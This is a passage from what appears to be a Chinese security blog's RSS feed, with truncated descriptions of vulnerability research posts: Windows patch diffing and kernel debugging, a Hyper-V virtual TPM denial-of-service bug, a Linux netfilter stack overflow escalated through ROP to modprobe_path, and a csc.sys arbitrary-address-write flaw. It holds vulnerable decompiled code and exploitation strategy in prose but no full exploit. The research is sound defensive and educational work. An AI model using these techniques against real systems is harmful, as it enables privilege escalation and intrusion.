（一）补丁对比及二进制逆向分析 通过在CVE数据库中的检索，发现近年来披露的Windows内核漏洞中不乏用户提权和任意代码执行等高危漏洞。然而，由于微软积极控制漏洞的影响，相关漏洞的公开PoC程序数量相对较少。对于那些没有公开PoC的漏洞，往往只能获得漏洞发现者通过博客或社交媒体透露的少量信息，难以由此开展系统性的漏洞研究。考虑到这些漏洞的修复补丁存在于Windows安全更新中，通过对补丁进行分析，包括进行补丁的解包和二进制对比等，能够有效地从中提取出更新内容，识别受影响的模块，并可以进一步地从中提取关键的补丁点，由此分析补丁所修复的漏洞。
为了能够解析微软的Windows安全补丁，首先需要了解补丁的格式以及获取方法。打包补丁的文件格式包括：.MSU（Microsoft Standalone Update）和.CAB（Cabinet）格式。补丁一般会作为 Windows 更新的一部分自动分发到用户设备上，但也可以直接从微软的更新目录中下载独立的补丁。此前，微软主要提供顺序的更新包，它们必须依次安装到用户的系统中。如今，更新以累积的方式提供，这意味着基本系统版本中的所有必需更新都包含在补丁包中，这也允许用户平滑地升级系统版本。此外，出于节省带宽等考虑，许多更新以增量的方式分发，即：更新包中只包含对特定二进制目标的修补方式，而不包含全部的文件。这也进一步增加了补丁分析的难度。
对于每次安全更新，具体的补丁文件可以从Microsoft Update Catalog上获取。.MSU格式的补丁在使用expand.exe程序解包后，将能够获得.CAB格式的补丁文件，且这些文件按照指令集和二进制差异类型进行命名。对于补丁内容的进一步提取，将依赖于微软提供的msdelta.dll库。该库中提供了ApplyDelta系列函数用于执行Windows系统更新。通过C或Python语言调用相关库函数，即可实现打补丁的过程，获得补丁之后的二进制文件。
图2：漏洞CVE-2023-21537补丁对比
最后，通过BinDiff或Diaphora等二进制对比工具，即可完成对补丁内容的分析，并由此定位到漏洞点。如图2所示，以漏洞CVE-2023-21537为例，通过对比分析补丁前后的函数控制流图，可以发现补丁新增了参数检查的分支（见红色框）。在确定可能的漏洞点后，即可开展人工的逆向分析。
（二）Windows内核调试 在成功确定漏洞点后，下一步是构造PoC程序，并触发漏洞行为，例如使内核出现崩溃，造成蓝屏死机（Blue Screen of Death）。再此基础上，可以进一步构造漏洞利用的方式，例如，利用释放后使用（Use after free）漏洞来覆盖关键的内核数据结构，实现进程提权的效果。
为了触发内核中的漏洞代码的执行，需要构造用户态程序执行系统调用或驱动程序的IoControl调用。这些函数调用往往需要大量的参数，并且，参数需要满足一定的约束条件。在实际的测试中，发现通过人工构造的参数难以一次性通过检查，必须不断进行调试并修改PoC程序。
微软提供了WinDbg程序用于支持Windows内核调试，但由于在内核函数中触发断点等操作会中断整个系统的执行，因而必须在另一台计算机上运行WinDbg，并通过TCP连接至待调试的计算机。在实际的实验中，相关的内核调试借助Hyper-V虚拟机完成。经笔者测试，运行在Hyper-V虚拟机中的Windows系统开启内核调试模式并设置端口和密钥参数后，即可在Host上通过WinDbg程序开启TCP连接进行内核调试。
三、典型漏洞分析 笔者总共分析和研究了10个近年来被披露并分配了CVE编号的Windows内核竞态条件安全漏洞，具体的漏洞编号、内核模块和漏洞类型情况如表1所示。下面将通过案例分析介绍其中的典型漏洞，以及对未来针对此类漏洞进行自动化挖掘的启发。
CVE ID 内核模块 漏洞类型 CVE-2018-7249 secdrv.sys UAF CVE-2018-8410 ntoskrnl Double dereference CVE-2018-8611 ntoskrnl UAF CVE-2020-1015 UMPS UAF CVE-2021-26868 win32k UAF CVE-2021-40449 win32k UAF CVE-2021-41335 ntoskrnl OOB CVE-2022-29142 ntoskrnl UAF CVE-2023-21536 ETW UAF CVE-2023-21537 mqac.</description>
    </item>
    <item>
      <title>Microsoft Hyper-V 虚拟 TPM 设备漏洞分析</title>
      <link>http://localhost:1313/blog/tiangongarticle002/</link>
      <pubDate>Wed, 25 Oct 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle002/</guid>
      <description>Microsoft Hyper-V 虚拟 TPM 设备漏洞分析 一、漏洞描述 2023年10月微软发布的安全更新中，修复了2个由笔者报送的Hyper-V虚拟TPM设备漏洞。本次修复的Hyper-V虚拟TPM组件的漏洞可以通过远程访问虚拟机的方式触发漏洞，造成宿主机拒绝服务或者远程代码执行，对宿主机上的其他虚拟机或业务造成损失。
二、背景介绍 Hyper-V的虚拟TPM组件旨在为虚拟机提供模拟的TPM设备，虚拟TPM设备可以为依赖TPM设备的服务或者操作系统（例如Windows 11）提供支持。
漏洞位于vmsp.exe进程中的TpmEngUM.dll二进制文件中，本次介绍的两个虚拟TPM组件的漏洞就是位于TpmEngUM.dll这个二进制文件中。
vmsp.exe进程与vmwp.exe进程相似，都是一个虚拟机实例启动一个进程。但是不同的是vmsp.exe进程是隔离用户模式(IUM)进程，也就是说vmsp.exe进程无法在windows用户态下被正常attach。所以在调试上，针对vmsp.exe进程的调试就需要额外的“手脚”，这里我们引用Quarkslab博客的文章（https://blog.quarkslab.com/debugging-windows-isolated-user-mode-ium-processes.html），感兴趣的读者可以去了解并实践下，这里不做讨论。
三、环境搭建 虚拟TPM组件漏洞的触发需要在Hyper-V虚拟机设置中的“安全”设置中，勾选“启用受信任的平台模块”。
四、漏洞分析CVE-2023-36717 该漏洞是一个拒绝服务漏洞，当这个漏洞被触发时会导致宿主机vmsp.exe进程进入死循环，并占用大量CPU计算资源。由于vmsp.exe进程是IUM进程，所以当漏洞被触发后，管理员无法从用户态结束掉这个进程，这种情况下除非重启宿主机操作系统否则计算资源一直无法被释放。
这个漏洞位于TpmEngUM!TPM2_ECDH_KeyGen函数中。
__int64 __fastcall TPM2_ECDH_KeyGen(unsigned int *a1, __int64 a2) { OBJECT *v3; // rax OBJECT *v4; // rsi unsigned int v5; // eax unsigned int v6; // ebx unsigned __int16 v8[28]; // [rsp+20h] [rbp-58h] BYREF v3 = ObjectGet(*a1); v4 = v3; if ( v3-&amp;gt;public_type != 0x23 || (v3-&amp;gt;public_objectAttributes &amp;amp; 0x10000) != 0 || (v3-&amp;gt;public_objectAttributes &amp;amp; 0x20000) == 0 ) { return 0x19Ci64; } while ( !</description>
    </item>
    <item>
      <title>CVE-2023-0179 Linux内核提权</title>
      <link>http://localhost:1313/blog/tiangongarticle001/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle001/</guid>
      <description>CVE-2023-0179 Linux内核提权 0x00 前言 2022年7月为天府杯准备的Linux提权漏洞，但是22年天府杯没办，23年1月被外国人报了。
思路来源于这篇文章，在看到这篇文章后决定去好好过一下netfilter相关模块。
文章链接：How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables
0x01 背景 该漏洞位于Linux内核中netfilter模块对vlan进行处理的相关代码中，由于整型溢出导致的栈溢出，最后是ROP修改modprobe_path路径完成提权，在Ubuntu下测试可以稳定触发，提权成功率百分之百。
0x02 漏洞成因，加还是减 下面是漏洞代码，处理vlan相关的部分代码。
/* add vlan header into the user buffer for if tag was removed by offloads */ static bool nft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len) { int mac_off = skb_mac_header(skb) - skb-&amp;gt;data; u8 *vlanh, *dst_u8 = (u8 *) d; struct vlan_ethhdr veth; u8 vlan_hlen = 0; if ((skb-&amp;gt;protocol == htons(ETH_P_8021AD) || skb-&amp;gt;protocol == htons(ETH_P_8021Q)) &amp;amp;&amp;amp; offset &amp;gt;= VLAN_ETH_HLEN &amp;amp;&amp;amp; offset &amp;lt; VLAN_ETH_HLEN + VLAN_HLEN) vlan_hlen += VLAN_HLEN; vlanh = (u8 *) &amp;amp;veth; if (offset &amp;lt; VLAN_ETH_HLEN + vlan_hlen) { u8 ethlen = len; if (vlan_hlen &amp;amp;&amp;amp; skb_copy_bits(skb, mac_off, &amp;amp;veth, VLAN_ETH_HLEN) &amp;lt; 0) return false; else if (!</description>
    </item>
    <item>
      <title>以 CVE-2024-26229 为例分析 Windows RDBSS 机制</title>
      <link>http://localhost:1313/blog/tiangongarticle037/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle037/</guid>
      <description>以 CVE-2024-26229 为例分析 Windows RDBSS 机制 一、前言 CVE-2024-26229是今年4月微软修补的一个任意地址写零漏洞，该漏洞位于csc.sys驱动中。攻击者在Windows上获得较低权限的任意代码执行后，可以利用该漏洞将低权限提升至system权限。目前Exp由varwara公布在了github上。
二、csc.sys简介 csc.sys(Windows Client Side Caching Driver)是脱机文件(offline files)功能的一部分。脱机文件功能是默认在本机存一份共享文件的副本，这样做的优点有两点，一方面可以节省网络流量，另一方面是断网条件下，仍然可以使用共享文件夹，等到有网之后再进行同步。默认副本文件存储在C:\Windows\CSC文件夹中，普通用户没有权限访问该文件夹的内容。
下面以SMB协议为例，演示如何开启脱机文件功能。
首先准备两台虚拟机，一台为SMB server，一台为SMB client。
在SMB Server首先新建一个文件夹，然后共享此文件夹，并设置此权限为完全控制。
在SMB client打开控制面板进入同步中心-&amp;gt;管理脱机文件-&amp;gt;启动脱机文件。
然后访问SMB server，点击始终脱机可用。
之后就会出现一个新的文件夹，即为本机副本。
此时关闭share文件夹分享，仍然能操作share文件夹。
三、漏洞成因分析 通过README可以看出该漏洞产生的原因是在csc.sys中没有校验用户态以METHOD_NEITHER方式和驱动进行通信时用户态传入的缓冲区地址是否是合法地址，从而导致任意地址读或者任意地址写。
下面介绍一下windows用户态与驱动的通信方式来解释为什么以METHOD_NEITHER与驱动进行通信时需要对用户态传入的地址进行合法校验。
在windows中用户态与驱动的通信方式共有三种:
METHOD_BUFFERED METHOD_IN_DIRECT METHOD_OUT_DIRECT METHOD_NEITHER METHOD_BUFFERED方式对UserInputBuffer和UserOutputBuffer都进行缓冲，驱动程序无需对用户态传入的缓冲区地址进行校验。
METHOD_IN_DIRECT和METHOD_OUT_DIRECT只对UserInputBuffer进行缓冲，对于UserOutputBuffer采用的是将用户态地址锁定(即不让其换出内存)，然后映射为内核地址。在驱动写入后，重新映射为用户态地址。
METHOD_NEITHER (也就是出现漏洞的这种通信方式) 驱动程序直接读写用户态的缓冲区，优点是读写更快，缺点是驱动程序在读写缓冲区之前需要使用ProbeForRead/ProbeForWrite函数去探测地址是否合法。就可能会出现漏洞，例如用户态的传入的UserInputBuffer和UserOutputBuffer均为内核态地址，驱动就会根据用户态传入地址读写，即可造成任意地址读写。
四、补丁分析 可以看到有两个函数有改动，既然本漏洞是关于I/O control的，那么优先看CscDevFcbXXXControlFile这个函数改动。
通过bindiff可以看到从00000001C006B243这个块开始有所不同，定位到对应的反编译的伪c代码进行比较。
在patch之后的代码加了一个if判断
如果if 判断条件为true，则首先在使用前判断v12是否小于0x24 如果小于0x24，则调用失败
如果大于等于0x24，则会判断(a1+40)+64的是否不为0，这里推测如果为1的话，应该表示该请求来自用户态
如果不为0，则会使用ProbeForWrite探测a1+536的地址是否合法 然后对a1+536的位置写入一个8字节的0 (这里可能就是未patch的漏洞点了)
如果if判断条件为false，则使用原来的漏洞代码 patch代码保留原来漏洞代码目的推测为微软可能认为新代码可能会影响正常的功能，一旦遇到问题可以只需要改一下某个标志位就可以回滚回原来的代码，等到新代码完全稳定后估计就会删除原来的漏洞代码。
五、漏洞触发流程分析 从目前的分析来看，这个漏洞模式比较简单，为什么之前没有被人扫描到或者分析出来，我认为有两点原因。
ida反编译显示错误，有的时候你看csc.sys驱动的DriverEntry函数,可能如下图所示： 如果你多次Undefine然后重新反编译DriverEntry，就会发现DriverEntry函数是很长的。
csc.sys是一个内核网络微型重定向器驱动程序(Kernel Network Mini-Redirector Driver)使用了重定向驱动器缓冲子系统 (Redirected Drive Buffering Subsystem) 使得处理DeviceIoControl调用栈过深，不易被发现。 由DriverEntry可以看到用户态所有请求都由CscFsdDispatch处理，跟进CscFsdDispatch函数可以发现大部分的请求都是由导入函数RxFsdDispatch处理
RxFsdDispatch是由rdbss.sys中实现，下面介绍以下csc.sys与rdbss.sys交互为例介绍rdbss机制。
5.1 rdbss机制分析 csc.</description>
    </item>
  </channel>
</rss>
